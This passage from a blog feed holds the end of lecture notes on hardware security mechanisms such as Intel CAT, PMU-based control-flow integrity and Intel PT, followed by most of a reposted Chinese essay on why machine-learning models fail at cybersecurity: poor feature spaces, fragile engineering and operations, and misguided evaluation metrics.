uncommitted data in the transaction</li><li>Before committing the computation result, all sensitive data arecarefully cleared</li></ul><h3 id="intel-cat">Intel CAT</h3><h4 id="the-noisy-neighbor-problem">The Noisy Neighbor Problem</h4><p>“noisy neighbor” on core zero over-utilizes shared resources in theplatform, causing performance inversion</p><p>Though the priority app on core one is higher priority, it runsslower than expected</p><h4 id="software-controlled-cache-allocation">Software Controlled CacheAllocation</h4><p>The basic mechanisms of CAT include:</p><ul><li>The ability to enumerate the CAT capability and the associated LLCallocation support via CPUID</li><li>Interfaces for the OS/hypervisor to group applications into classesof service (CLOS) and indicate the amount of last-level cache availableto each CLOS</li><li>These interfaces are based on MSRs: Model- Specific Registers</li></ul><h3 id="pmu">PMU</h3><h4 id="monitor-control-flow-by-existing-pmu">Monitor Control Flow byExisting PMU</h4><p>PEBS: Precise Performance Counter</p><ul><li>Save samples in memory region for batching</li><li>Atomic-freeze: record exact IP address precisely</li></ul><p>BTS: Branch Trace Store</p><ul><li><p>Capture all control transfer events</p></li><li><p>Also save exact IP in memory region</p></li></ul><p>LBR: Last Branch Record</p><ul><li>Save samples in register stack, only 16 pairs</li></ul><p>Event Filtering</p><ul><li>E.g. “do not capture near return branches”</li><li>Only available in LBR, not BTS</li></ul><p>Conditional Counting</p><ul><li>E.g. “only counting when at user mode”</li></ul><h4 id="main-idea">Main idea</h4><p>Leverage PMU for CFI Monitoring</p><ul><li>Using already existing hardware</li><li>No need to modify software</li></ul><p>Two Phases</p><ul><li><p>Offline phase: Get all the legal targets for each branchsource</p></li><li><p>Online phase: Monitor all branches and detect maliciousones</p></li></ul><h4 id="branch-types">Branch Types</h4><p>Direct Branches</p><ul><li>Direct call</li><li>Direct jump</li></ul><p>Indirect Branches</p><ul><li>return</li><li>indirect call</li><li>indirect jump</li></ul><h4 id="target-address-sets">Target Address Sets</h4><p>Target Sets for indirect branches</p><ul><li>ret_set: all the addresses next to a call</li><li>call_set: all the first addresses of a function</li><li>train_sets: all the target addresses that once happened</li></ul><h3 id="intel-pt">INTEL PT</h3><h4 id="intel-processor-tracing-ipt">Intel Processor Tracing (IPT)</h4><p>Privileged agent configures IPT per core</p><ul><li>Define memory location and size for tracing</li><li>3 filtering mechanisms: CPL, CR3, IP range</li></ul><p>Efficiently captures various information</p><ul><li>Control flow, timing, mode change, etc.</li></ul><p>Challenges: Fast Trace VS. Slow Decode</p><p>Performance overhead is shifted from tracing to decoding, decoding isseveral orders of magnitude slower than tracing</p><h4 id="flowguard">FlowGuard</h4><p>FlowGuard: transparent, efficient and precise CFI</p><ul><li>Transparent: no source code needed, no hardware change</li><li>Precise: enforce fine-grained CFI with dynamic information</li><li>Efficient: reconstruct CFG and separate fast and slow paths</li></ul><p>Evaluation results</p><ul><li>Apply FlowGuard to real machine with server workloads</li><li>Prevent a various of real code reuse attacks</li><li>Less than 8% performance overhead for normal use cases</li></ul><h4 id="usage-of-microcode">Usage of Microcode</h4><ul><li><p>Customizable RDTSC Precision</p></li><li><p>Microcode- Assisted Address Sanitizer</p></li><li><p>Microcoded Instruction Set Randomization</p></li><li><p>Microcode- Assisted Instrumentation</p></li><li><p>Authenticated Microcode Updates</p></li><li><p>μEnclave</p></li></ul><h2 id="conclusion">Conclusion</h2><ul><li>Hardware VS. software</li><li>User-mode VS. kernel- mode</li><li>Integrity VS. privacy</li><li>Heterogenous VS. homogenous</li><li>Encryption VS. isolation</li><li>Side channel attacks &amp; physical attacks</li></ul>]]></content>
    
    
    <categories>
      
      <category>Security Research</category>
      
    </categories>
    
    
    <tags>
      
      <tag>System Security</tag>
      
      <tag>Hardware Security</tag>
      
      <tag>Memory Safety</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>【转载】为什么机器学习解决网络安全问题总是失败</title>
    <link href="/2021/11/29/why-ml-fails-security/"/>
    <url>/2021/11/29/why-ml-fails-security/</url>
    
    <content type="html"><![CDATA[<blockquote><p>本文由toooold原创发布</p></blockquote><h1 id="谈谈特征空间">谈谈特征空间</h1><p>本文的所有内容与作者的日常工作无关，其观点也仅代表作者个人意见，与作者的雇主无关。</p><p>近年来网络安全从业者纷纷神往机器学习的魔力，加之深度学习在图像、NLP等领域的成功，大家都想在此寻求一发银弹。不过作者在安全业界没有看到太多如虎添翼的机器学习案例，更多的是对生产环境里金玉其外的模型效果的失望，“模型误报太多了，运营没法处理”，“就这两个独检结果还不如我写两条规则”，“PPT上说深度学习、自我演化，实际都是if-else”等等。为什么机器学习解决网络安全问题总是失败呢？</p><p>机器学习模型在解决网络安全问题时效果不好的原因大致可以归结为这几类：</p><ul><li>错误的特征定义和样本标记</li><li>算法的脆弱，工程的脆弱，运营的脆弱</li><li>错误的评价标准以及错误的优化方向</li><li>误解机器学习就是人工智能算法的全部</li></ul><p>我们先从特征空间和样本标记谈起。</p><h2 id="什么是合理的特征空间">什么是合理的特征空间</h2><p>图像识别问题的特征就是一张张图里的像素，NLP特征就是文本里的文字，那么网络安全类的特征就是每一条WAF 攻击记录的字符，每一个恶意软件二进制文件的字节码，这样对吗？</p><p>合理的描述问题本质的特征空间可以让模型轻松解决问题，而错误的选择了特征空间会让问题难度成倍上升。不妨看这个例子：如果问大家，心算5765760 加上 2441880等于多少，任何一个学过基本算数的人都会毫不费力的答出8207640。但如果是心算 5765760 乘以 2441880呢？这几乎可以难倒一片小伙伴。这是因为十进制不是乘法友好的表示方法，因为我们选错了特征空间，所以问题就人为的变难了。对乘法更友好的表示方法是因式分解，如果把题目换成“<code>11*12*13*14*15*16</code>乘以<code>17*18*19*20*21</code>“这个等价问题的话，它的答案甚至比之前的加法还简单。</p><p>一个异曲同工的例子是 <code>malconv</code>深度学习检测恶意软件，类似的基于字节码的卷积方法并不能学到正确的特征空间。Raffet al 等作者的 “Malware Detection by Eating a Whole EXE”使用二进制文件本身作为输入，试图利用卷积网络从 010101这样的原始字节码特征空间构建一个端到端的恶意软件静态检测分类模型<code>malconv</code>，它在自己论文的测试集上可以达到 90% 以上的AUC。然而，抛开其对新样本和对抗样本检测时极不稳定的表现，“DeepMalNet:Evaluating shallow and deep networks for static PE malware detection”这篇文章引入新的测试集对比了 <code>malconv</code>等多个深度模型以及论文作者自建的随机森林模型后发现，通过手工构建特征工程的随机森林模型也几乎可以达到并超过<code>malconv</code>的效果。究其原因，卷积网络在原始字节码上并不会学习到合适的特征空间，论文中展示的有效性更多是碰巧的结果。Fireeye的研究人员 Coull et al 的文章 “Activation Analysis of a Byte-Based DeepNeural Network for MalwareClassification”表明了<code>malconv</code>的卷积结果其实是把静态二进制文件的文件头信息当作当作主导特征，而由指令跳转组合对模型预测分类的权重极小，其后续改进<code>EMBER malconv</code> 也延续了类似特性，具体的分析和解释可以参见Bose et al “Explaining AI for Malware Detection: Analysis of MechanismsofMalConv”。如果加以使用一定的领域知识工具，比如获取函数导出表、利用一些动态特征比如沙箱采集的函数调用序列，或者使用静态反编译得到指令集序列，将原始二进制转换到这些更能表征软件运行时行为的特征空间当作输入数据集，其机器学习模型的表现比<code>malconv</code>类仅用字节码卷积方法的稳定的多，分类效果也更好，请有兴趣的小伙伴阅读相关参考文献并继续调研。</p><p>同样的道理，我们也不能期望有一个精准的端到端的模型在不需要切分和筛选token 的情况下，仅基于原始的 WAF记录即可预测攻击，也不能期望一个模型学习到 DGA的字符组合方式并精确分类甚至生成新的 DGA域名，更不能幻想有一个深度学习模型读入任意 HTTPS数据流即可精确预测其对应的网站。市面上的机器学习模型在解决这些问题上的失败均证明了选择合适特征空间的重要性：模型在错误的特征空间上可能因为碰巧适应特定数据集而产生所谓“好结果”，但这些结果不够稳定也远不足以支撑生产环境和产品的质量。</p><h2 id="为什么模型效果和特征空间相关">为什么模型效果和特征空间相关</h2><p>大家经常提到的“机器学习”指的是基于样本的统计学习，它学习的结果是样本在其特征空间分布的统计期望。我们可以借用一句古诗“横看成岭侧成峰”来理解特征空间对模型判别的影响。如果特征空间并不能描述造成样本分布的本质原因，其特征的数值分布就不能提供足够的判别能力，直观地说，模型只能“横看”到一连串的“岭”而不能“侧看”独立的“峰”，那么模型顶多在“岭”上大概划分个差不多的样子以适应现有数据集，于是，它“不识庐山真面目”的丢失了“峰”所代表的实质特征。</p><p>特征空间与样本标记方法也有关联。基于样本的统计学习有一条实战经验，再好的模型也只能尽可能学会人工的标记。网络安全从业者常常认为，“模型只能学会我规则标记的样本，要这破模型有何用呢？”据本文作者观察，很多模型的工作均掉入“标记样本仅为标记原始样本”这一误区，而有经验的数据科学家会标记与表征空间对应的样本，它可以是原始样本在新空间的映射，比如各种关联图模型里学习到的向量表示，也可以是原始样本的拆分，比如基于汇编码区块的恶意文件检测等，这些合理的样本选择和标记跳出了原始样本的局限，并使用更简单可靠的模型解决问题。</p><h2 id="如何寻找正确的特征空间">如何寻找正确的特征空间</h2><p>有些特征显而易见，有些特征需要绞尽脑汁。“岭”和“峰”的区别不仅限于同一个数据集里的特征选择或者特征超平面的转换，更重要的抛开“显而易见”“想当然”的特征，寻求能够描述样本分布本质原因的特征。一个典型的例子是前一篇博客“为什么LSTM 检测 DGA 是无用功”里提到的一类 LSTM 检测 DGA的算法，它们的特征空间为每个域名的相邻字符串组合，LSTM模型事倍功半的去拟合可以产生这些相邻字符组合模式的未知函数，这远远超过了LSTM这个浅模型的学习能力。事实上，现在还没有一个足够聪明的网络结构可以在小数据集上学习到包含异或、移位等复杂操作的函数。多数DGA 的本质特征为由 DGA算法产生域名序列，按照多个域名的序列映射到嵌入空间或利用其共同出现的概率可以更好的对其行为建模，利用简单的图嵌入模型或者邻接矩阵计算即可达到很好的DGA 检测效果。</p><p>寻找正确的特征空间并没有一劳永逸的办法，暂时也没有更高的人工智能的辅助或自动化，它需要的是数据科学家对现有模型的分类原理有深入的理解，也从数据模型的角度对安全领域的基础知识有根本的认识。因为本文作者看到过太多建立在错误的假设和特征空间的工作，所以建议数据科学家在头脑中保留这个问题并在解决问题过程中反复提醒自己：</p><blockquote><p>”这个特征空间可不可以表征问题的实质？“</p></blockquote><h2 id="总结">总结</h2><p>网络安全方向的数据算法模型不像机器视觉类问题有清晰直接的样本定义。它更像语音和空间控制类的问题：它要求该领域的数据科学家对领域知识有更深入的了解，探寻<strong>可以表征问题实质</strong>的特征空间，并聪明的将问题从其表面映射到实质的特征空间。加以合适的样本标记方法描述这些特征的分布，而非迷信深度学习带来天降神力，我们可以找到更合适办法去解决问题。</p><p>本文分析的是网络安全方向的建模在算法方向上失败的主要原因，我们还有若干话题，比如从系统上理解和处理模型的脆弱性等等，这些在以后的文章里都会谈到。不只是网络安全从业者，很多领域的研究人员和工程师也过分专注于模型本身，而忽略了建模是个系统工程问题，寻找更多更好的样本、更能描述本质的特征、对预测错误的处理等都是这个系统里重要的步骤。本文作者希望由此提起大家对系统和工程的关注，让机器学习和其他人工智能算法在网络安全领域发挥真正的作用。</p><h1 id="脆弱的系统工程">脆弱的系统工程</h1><p>用机器学习等算法解决网络安全问题常遇到数据模型与规则模型的效果之争，覆盖率与误报率的平衡，模型独检结果和防火墙整合的遥遥无期，这些都是数据科学家在设计算法时的纠结。然而一位资深安全研究员大哥喝高了一曲《有多少爱可以重来》扶着我吐露了他的内心：</p><blockquote><p>“算法才分对错，攻防只讲成本”</p></blockquote><p>数据模型的自我纠结以及与安全运营的矛盾都来自于脆弱的模型预测结果，或者说，很多数据模型只是给安全运营团队或者安全产品使用者抛出了一个半成品，导致了“你这个模型没法用”，“我为什么信你的结果”等等负面反馈。应用机器学习等算法解决网络安全问题并不仅是算法本身的工作，<strong>它是一个系统工程，其脆弱性来自于系统的每一步</strong>。接着上篇特征空间和样本标记的讨论，我们简单谈谈系统工程框架下如何理解算法的脆弱，工程的脆弱，以及运营的脆弱，并有效的避免其对解决方案的负面影响。这里的讨论也不仅限于网络安全行业，多数内容也适用于其他使用算法模型的工业界场景。</p><h2 id="算法的脆弱">算法的脆弱</h2><p>除了准确度召回率等衡量预测质量的指标，为解决网络安全领域问题设计的算法对预测结果的茁壮性也有若干特别的要求，最重要的是识别错误结果并且提供妥善的处置方法，就像基于机器视觉的自动驾驶一样，需要保证即使模型误判也不会撞墙。然而业界对这个主要原因的讨论甚至少于非平衡数据和小数据集标记等引起算法脆弱的其他原因。</p><p>错误的预测结果客观存在，作为算法提供方的数据科学家不能忽视，也不能惧怕它的存在。一个看似完美的AUC是多数论文的结论，而它只是所有工业界工作的开始。在机器学习论文里常见0.1%误报率可能会被工业界以亿为基本计量单位的海量数据放大成几十万条运营数据，每一条预测结果数据都与运营的时间人力资源相关。因为运营或者产品团队关于误报带来成本的反馈，数据科学家作为算法的提供方惧怕误报，并限制了算法构建时的思路，比如说，为了极少的精度提高而在判别模型的召回率上的较大妥协，手工添加大量名单规则对结果过滤，甚至因为模型精确度没有上90%即放弃等等。忽视或者惧怕错误的预测结果是算法脆弱性的最主要原因。</p><p>与其忽视或惧怕，不如正视其成因并开始思考如何妥善处理。从算法角度来看误报，其最大原因是源自对事件观测的信息不全，这是网络安全在防守方的客观劣势。攻击方可以在多个角度设计并投入攻击资源，而防守方只能以自己观测到的部分建模，即使在防守方的资产上布满了完备的检测点，我们也很难完全透析攻击方的所有动作，更何况完备的检测点本身也是挂一漏万。正如鲁迅真的说过这样，“于是所见的人或事，就如同盲人摸象，摸着了脚，即以为象的样子像柱子。”<code>*</code>在信息不全的情况下建模带来的不确定性要求从系统工程角度容忍不确定性并识别处理错误结果。</p><p>当然算法的脆弱来自于多个方面，我们也不能忽视数据集的选择偏差带来的算法偏向性，比如某犯罪预测模型默认地域和肤色与犯罪率的极高相关性，也不能削弱样本采集和标记的统计误差的影响，比如某保险风控模型认为100岁以上老人结婚率很低，更不能期望“未知的未知”威胁<code>*</code>可以通过已知的建模轻松解决，比如业界某些产品声称自己的AI 模型可以检测并处理所有 APT攻击。我们先从当前市场上最主要的脆弱性着手，一步一步前进。</p><h2 id="工程的脆弱">工程的脆弱</h2><p>业界绝大多数的论文不会涉及算法的工程实现，而工程实现上保证模型结果的可用性是脆弱的另一个主要来源，它包括上下游数据的可用性，算力的支持，监测和恢复系统等，同时数据可访问难度也是一个重要因素。</p><p>网络安全行业的多数算法模型根据自身或者客户平台采集的日志等数据源建模，这些日志由专门的团队负责采集，保存为互不相同的文件格式，有着不同的实时性和可靠性，并利用不同的数据平台输出，加之各种情报和第三方五花八门的格式，以及数据里各种字段的定义和冲突，这些学术论文里不会提到的数据采集的工作是数据科学家建模之前必须要面对的几件棘手工作之一。</p><p>即使能够顺利采集并整理出可用的数据集，稳定并及时的计算结果也是工程脆弱性的另一个因素。比如作者在实现前文提到的<code>domain2vec</code>这个将序列共现概率转化为几何向量空间的模型时，每小时约10亿条 DNS记录要求的算力为其工程化带来不小的挑战。因为每个时间段的 DNS数据流量可能有完全不同的模式，我们必须在该时间段内完成数据的采集和模型的计算，以避免结果的延迟和计算平台的阻塞。</p><p>数据质量和模型完成的监控与恢复也常被忽视，其负面影响直到出现重要事故或者入侵事件时才发现，模型本来可以检测并阻止这些事件的发生，但是因为上游数据的丢失或延迟、共用计算平台的排队过长、模型的白名单版本错误、模型代码OOM等原因，导致了最终结果的无效。有些安全团队和公司并不认为这些监控和恢复是核心工作，往往不投入足够的资源和优先级，而这恰好是“千里之堤溃于蚁穴”的典型案例。</p><p>在理想条件下，数据科学团队可以不受限制访问所需的数据，而在监管环境的要求以及公司利益的博弈下，数据的持有者和可以构建数据模型的团队并不能完美融合，这样的数据壁垒也是导致工程脆弱性的一个重要因素。</p><h2 id="运营的脆弱">运营的脆弱</h2><p>多数安全运营团队缺少处理模型预测结果的相关机制，它无形中推高了每个案例的运营成本，这是运营脆弱的主要原因，而网络安全对领域知识的门槛也使得数据科学团队难以助力。它主要有两方面因素，算法模型是否支持运营所需的信息，以及运营是否理解模型预测的结果。</p><p>数据科学家往往觉得模型的任务仅限于提供预测结果，如果正确就万事大吉，错误的话，大不了损失点召回率换精度也可以。可是正确的结果也需要运营，就好比模型检测出某个视频内含有暴恐内容，而运营团队需要一帧一帧查找这一个多小时的视频，又好比模型检测出新的APTC&amp;C，却让运营团队挨个排查几十台主机几百个进程和文件。正如坊间传言在亚马逊负责包裹分发算法的团队要跟着快递卡车送了一个月快递，对运营团队的工作置身事外的数据科学团队也做不出有效的数据模型。</p><p>运营团队的相关机制、工具框架以及培训也没有跟上数据科学时代的步伐。多数运营团队并不分级而是全力投入所有人力处理检测结果，这就导致了不管案例复杂程度都随机分配给团队中经验等级不同的安全研究员。同时，事件调查和进一步行动所需的上下文信息也分布在数据系统的各个角落，需要使用多种工具按需查询。安全研究员理解并使用算法的预测结果也有一定阻碍，包括对结果的归因分析，如何在例如防火墙等产品中应用预测结果，以及合理处置因预测的不确定性带来的影响等。这些阻碍带来的运营焦虑感进一步阻碍了安全研究员使用数据模型的结果，数据科学和安全运营团队的对话常常终结于“你就明确告诉我能不能阻断吧”。</p><p>在以上两个因素之上的，还有安全运营团队与数据科学团队因为领域知识构成的不同造成的沟通交流障碍也导致“反馈迭代”这个常规方法不能顺利执行，安全运营团队更看重对事件的作为个体的特点，同时也专注于特定事件的具体描述，而数据科学团队却因为背景知识的缺乏而难以从这些具体描述中剥离并抽象出模型上的共性，交流的双方总觉得鸡同鸭讲，讨论也没有什么结果。这些大大小小因素的堆积导致了运营的脆弱。</p><h2 id="关于如何坚强起来的一些建议">关于如何坚强起来的一些建议</h2><p>从系统工程角度看，消除脆弱性及其影响差不多需要这些工作：</p><ul><li>识别错误的结果，并提供对正确和错误结果的解释。</li><li>建立现代化成熟的数据仓库和相关工程框架，保证模型的可用性</li><li>为模型预测结果的运营建立相关机制，提供工具和培训</li></ul><p>这里的每一步都和其他工作相辅相成，实际工作中也有很多案例展示了改善算法修正工程难点，重新设计安全架构降低算法难度等方法。请各位小伙伴从系统工程这一整体来理解以下的建议。</p><p>算法需要收集错误结果的渠道。常见的误区来自于错误结果完全依靠用户反馈，这除了惹恼用户之外几乎没有任何意义，反而会导致海量的告警信息阻塞了运营队列，使得使用安全产品的团队或者运营团队不得不依照经验丢弃大部分告警以保证运营带宽。这种情况下，安全团队不仅没有时间提供反馈，甚至会让模型提供方误以为自己的模型很完美，而事实上是用户已经懒得理你了。合适的反馈渠道可以有多个阶段：</p><ul><li>基于模型特征的反馈：它一般是基于其他特征的规则或者机器模型。例如算法预测的鱼叉钓鱼页面是google首页，它可以通过与流量排序模型交叉验证并利用“高流量网站与鱼叉钓鱼的相关性很低”的事实排除。这类反馈利用多种其他特征有效补充了检测模型观测攻击模式时的视野局限，从理论基础上提供了反馈方式，并可标记绝大多数的错误。</li><li>基于关联知识的反馈：如果一个预测结果是正确的，它的关联结果也应该是正确的，直到将关联延伸若干步骤达到一个错误结果。例如算法预测了某个域名为恶意软件C&amp;C ，它可以通过在 DNS 查询记录对应的 IP 记录关联延伸到沙箱里访问该IP 的二进制在 VirusTotal或者其他检测引擎或者安全团队的二进制文件分析结果，直到完成了整个链路的延伸。这类反馈利用了特征空间之外的第三方知识作独立验证，成本略高于模型特征的反馈，是模型特征反馈方法的有效补充。</li><li>基于用户使用的反馈：经过前面几个阶段的努力，能够到达用户需要运营的结果已经很少。在算法提供的上下文信息的辅助下，用户可以结合自身的经验和更多的情报，对结果做出判断。这一步的用户反馈不仅是结果的正确与否，更重要的是用户根据哪些相关信息作出的判断。</li></ul><p>算法也要尽可能的提供对预测结果的可解释性，不仅是错误结果，<strong>算法也需要解释正确的结果</strong>。其中包括解释算法本身所用的特征（常见于深度学习模型），标记并定位判断依据（比如恶意脚本代码段的具体哪一行），以及该预测结果的上下文信息（比如上文提到的关联知识，例如该二进制由某URL 实行分发，该 URL下的其他已知恶意行为等）。关于解释结果的重要性，这里有一个直观的例子：我们不难发现，在数据模型和规则模型的效果之争里，虽然数据模型在多数情况下有着漂亮的纸面指标，安全运营团队仍然倾向于规则模型。这是因为运营人员可以通过阅读规则本身理解模型依据，加上自身的安全经验，以及从模型提供的信息出发的进一步调研等后续工作，最终可以做出合理的判断。从这一思路出发，Sophos的AI团队开源了一套从机器学习模型的结果转译出相关yara规则的代码<code>*</code>，这是一份很有意思的工作，属于解释算法本身所用特征的方法，有兴趣的小伙伴可以自行阅读。值得指出的是，提高模型结果的解释性不只是转译成规则，同时规则模型也没有完美的提供解释性，我们依然没有银弹。</p><p>算法也需要提供对错误结果的快速处理方法以及部分的自动化，包括合适的分诊算法，添加足够的上下文信息以辅助运营等。可能是因为学术届和工业界对此的讨论有限，无论是在数据科学方向还是在安全研究方向，分诊算法（Triaging）常常被忽视。常见的场景是一个有效的异常检测模型因为其需要运营的预测事件数量较多而被放弃，这无论对数据科学团队还是安全运营团队都是一个巨大损失，而分诊算法可以有效的对预测结果按照运营优先级排序并合理的安排运营资源。一个例子是作者的同事在2017 年 botconf 的演讲 Asiaee et al “Augmented Intelligence to ScaleHumans Fighting Botnets”<code>*</code>，在每小时亿级的 DNS日志流量里使用异常检测模型输出所有未见过的域名，并利用<code>domain2vec</code>构建域名之间的访问关联，以强关联模式作为运营的重要性指标做分诊排序，将每小时约千万级的异常事件降低到十几个有效的聚类，并成功应用到检测DGA恶意软件上。分诊算法有多种指标和方法，包含聚类、排序等，是一个与安全领域知识相关的数据科学方向，在此就不赘述，有兴趣的话可以以后再谈。</p><p>工程的脆弱性对业界有更广泛的影响，我们可以沿用别的领域带来的一般的解决方法，建立数据质量保证系统（DataQuality Assurance）。关于 DQA的相关建设，请小伙伴们自行阅读参考文献，对这一成熟方向在此依然不需赘述。</p><p>工程脆弱性的另一个原因是在网络安全行业更为突出的的数据壁垒问题。除了一些开放数据组织或者联盟之外，技术上必须提到含隐私保护的数据模型工程实现，简单来说就是模型不需要数据明文即可学习并预测。这类方法中的比较广泛使用的是联合学习（FederatedLearning），通过服务器-客户端的架构保证了模型和数据方的隐私，同时让模型得到需要的特征。这些联合学习的方法常见于一些NDR 和 XDR的初创企业产品中，暂时只在较为简单的一些场景上使用。在联合学习的实现上，FATE<code>*</code>通过一系列开源工作站稳了脚跟，有兴趣的小伙伴可以自行前往参考文献深入阅读。隐私保护计算利用了较高的计算成本在一定程度上缓解了数据壁垒问题，但根本上解决数据壁垒的工作还有很长一段路要走。</p><p>运营的脆弱需要数据科学团队和安全运营团地联手解决。在算法模型做到对结果的可解释性并且通过分诊算法将检测结果按重要性排序后，安全运营团队可以根据其提供的上下文快速的做出判断并决定后续的工作。同时，一些方便的数据工具可以帮助快速运营，比如方便好用的图数据库系统，这些可以由工程团队提供。与此同时作者观察到，对数据感兴趣的安全研究员可以是很好的老师，他们可以给数据科学家快速有效的教授相关背景知识，使数据科学团队更深入的理解安全问题并提出数据模型。这些跨越知识鸿沟的努力逐步解决运营的脆弱。</p><h2 id="总结-1">总结</h2><p>网络安全专业对结果的脆弱性有较高的要求。有经验的网络安全专业研究人员可能也发现了，以上关于脆弱性的讨论也适用于例如使用第三方威胁情报等其他方面，解决脆弱性的一般方法在此也适用，比如使用云上或者运营商流量对威胁情报做进一步自动化验证等，限于篇幅在此就不赘述。同样，由安全研究员领域知识和经验出发的规则模型也面临着结果的脆弱性：巧妙的检测规则需要足够的解释性，大量的陈年老酒型白名单规则需要维护和更新以及对抗蓝军的试验和猜测，模型检出结果缺乏可用的分诊重要性排序等等，这些都是规则模型也需要面对的问题。作者在此抛砖引玉，希望有安全研究的专业人士对规则模型的脆弱性及其解决方法展开讨论。</p><p>对于数据科学家来说，从系统工程解决脆弱性甚至比提出有效的检测模型更为重要。在大家一直争论的规则模型和数据模型哪个更实用的同时，我们也看到很多不完美的规则或者数据模型在很好的工程实现和运营支持下得到不错的结果，规则模型和数据模型互相验证和分诊，而非互相竞争。这也提醒我们在构建数据模型的时候，要跳出思维局限的井底，从更宽广的系统工程视角解决问题。</p><p>同样，由网络安全专业的需求出发，我们从系统工程角度也对模型的脆弱性进行了讨论，这些讨论和其一般性解决方法也可以适用于图像、视频、语音、风控、自动控制等其他依赖数据模型的行业。总的来说，工业界依赖的数据模型从来都是一个系统工程问题，我们必须从系统工程角度思考设计和解决。</p><h1 id="不合理的评估指标">不合理的评估指标</h1><p>网络安全和风险控制行业一向被认为是消耗商业价值的成本中心，所谓“安全一上，怨声载道。风控一拦，市场白玩”。与此同时，安全从业者需要通过保证系统和业务的整体安全以保持可持续的长期商业价值，毕竟靠黑产薅羊毛刷起来的日活和营收总有一天会以更高的代价还回去。从网络安全对长期商业价值的意义这一角度出发，我们可以讨论一下机器学习解决网络安全问题的第三大失败原因，不合理的评估指标。简单来说，我们在设定数据模型的评估指标时，有时候忘记了长期商业价值这一根本出发点。</p><p>文中关于设计评估指标的讨论在学术界并不多见，其原因可能来自于学届的研究的问题脱胎于具体问题并且独立于商业产品的细节，同时也有相对通用的评估指标，而工业界的具体问题与其商业价值关联更加紧密，更需要数据科学家将这些通用的指标具体化并关联到商业价值。</p><h2 id="为什么需要合理的评估指标">为什么需要合理的评估指标</h2><p>合理的评估指标为数据和安全模型在达成目标的道路上提供指导方向。对指标的提升可以直接映射到行业内的商业价值，从而驱动数据模型和安全模型有的放矢的提升，同时其带来的商业价值也保证对模型的持续投入，比如提升1% 的恶意软件检测率可以避免感染成千上万台云主机，缩短 0.01 秒的 WAF检测时间会提高客户主机网络吞吐量的阈值以更有效的抵御攻击风险等等。</p><p>网络安全行业需要在动态且强对抗环境下解决安全问题，由攻击方或者环境带来的不确定性也会带来设定评估指标的困扰。例如对入侵检测模型的评估，如果我的业务结构没有受到有效的攻击，这是因为我的检测模型做得好，还是因为对方没有能攻破前几层防线，或者干脆就懒得攻击我，甚至是其实被攻破了只是我不知道？这些对抗和动态环境使得数据科学团队在构建模型时常陷入两难境地，一方面想检测出更多的攻击，一方面想保证更好的防御，可是更好的防御意味着更少的攻击，那么如何如何评估防御指标？同样的困扰也存在于各个风险控制团队、漏洞巡视和检测团队等等。“善战者无赫赫之功”<code>*</code>，我们如何更好的构建和评估检测和防御体系呢？</p><p>在实际的工作中，作者发现设定合理的评估指标需要面临诸多挑战：那些不能正确反映长期商业价值的评估指标也往往错误的指引了数据和安全模型的研究方向，这些指标也常常挑起商业增长与安全防护的矛盾，更有甚者，部分从业人员迫于不合理的指标带来的压力而使用非常手段来利用指标的漏洞，使得模型和产品功能偏离其设定方向。</p><p>总的来说，合理的评估指标是连接优秀的建模工作和其商业价值的重要桥梁，它有效指引了模型工作的方向，而不合理的评估指标会让优秀的模型在错误的方向上努力，其不令人满意的结果也让建模工作承担不必要的责难。</p><h2 id="错误之一失去目标的指标">错误之一：失去目标的指标</h2><p>目标和指标的关系是数据科学基础知识之一，但这种“失去目标的指标”错误几乎占了不合理指标的绝大多数情况！</p><p>各位小伙伴在上课时有没有想过这个问题：既然判别模型为了追求准确，那机器学习模型为什么不用准确率代替目标损失函数进行优化呢？<code>*</code>抛开其背后的统计和数学原因（包括假设、后验和先验等以及他们的实际意义），直观的理解可以是，损失函数定义目标的优化方向，而准确率等指标评估其优化完毕时结果的好坏。准确率只能被人用来评估机器预测（指标）是不能被机器拿来判断对错（目标），否则机器会失去损失函数降低带来的优化方向而陷入它误以为的最优解。这也对应了人工智能课程提到的决策的基本原则：智能体需要做明智的决策而不仅是结果正确的决策。</p><p>但是聪明的人类在决策过程中却因为利益等原因混淆了目标和指标。我们见过很多因为考试作弊没有被抓而洋洋得意的学生最终的失利，也见过为了单日活跃用户数发出大量红包，但没有足以留存用户的产品功能而最终流失用户的各大APP。一时的考试成绩和几天的日活数字只是指标，指标只能在“牢固知识”和“构建好产品”这些目标下才有意义。</p><p>网络安全团队和网络安全产品的目标是为了保障自身和客户的资产免受网络攻击的侵害，在这一目标下，不同的领域有不同的子目标，以及对应的指标以衡量目标的达成情况。业界有很多指标不反映目标的情况，例如某WAF产品以自己每天为客户防御多少亿次攻击为指标，而不是以产品的易用易部署、低成本高吞吐、低延迟等更能反映其商业目标的指标。这样的“防御多少亿次攻击”的“想当然”的指标看似容易量化，但其荒谬程度就好比某消防站以扑灭多少次火灾为绩效考核标准一样，失去目标的指标对商业价值没有意义。</p><p>以这样的不合理指标评估的工作甚至会带来负面影响：它会在错误优化方向上浪费人力和计算资源，也变相鼓励短期效益忽略长期目标，甚至有时候它甚至纵容玩弄评估系统和弄虚作假。如果用威胁的覆盖率作为指标，那么模型可以认为所有活动均为恶意行为，并将大量事件输出给安全运营团队处理；如果用检测准确率作为指标，那么模型最好什么都不汇报，只要不预测就不会犯错；如果用告警量作为指标，那么模型会不加甄别的发送海量告警，只要足够多就可以拖垮客户运营团队让他们没时间投诉。可以对这些看似无理取闹的行为在实际工作中以不同形式真实存在。</p><h2 id="错误之二机械套用常规指标">错误之二：机械套用常规指标</h2><p>基于统计的机器学习判别模型是为了学习目标分布的期望而设计的，它暗示着算法总是被激励去预测多数群体的行为<code>*</code>，因为多数群体主导了目标分布的统计期望。如果机械套用常规的准确率召回率指标，而非理解算法更倾向于寻找多数群体行为并按照特定问题设计符合该问题的指标，不仅不能解决问题，反而会让人们对算法的有效性产生疑问。</p><p>网络安全中攻击事件的发生频率分布极度不平衡，攻击事件往往只有千万分之一的概率出现，同时每种攻击事件发现的难度千差万别，如果想当然的要求判别模型达到对攻击事件有90%的准确率，那么模型最好就什么都不检测，因为负样本比正样本高出若干数量级，单个样本的误判足以将准确率降低到接近于0，这类问题已经不能通过常规的非平衡样本方法解决。</p><p>网络安全的各种情况里，多数情况缺少基准事实（groundtruth），例如0day漏洞的发现，APT攻击等，在这种情况下对数据模型要求所谓的召回率，甚至所谓“未知威胁的召回率”，这样的指标可以说“连错误都算不上”（“notevenwrong”）。”世界上只有两种公司，一种被黑客入侵过，另一种将被入侵。“<code>*</code>我们同样也不能等待自己被入侵以计算召回率。入侵攻击事件的对商业的效果有很大延迟，比如若干年后的数据泄露，或者暗网上正在出售已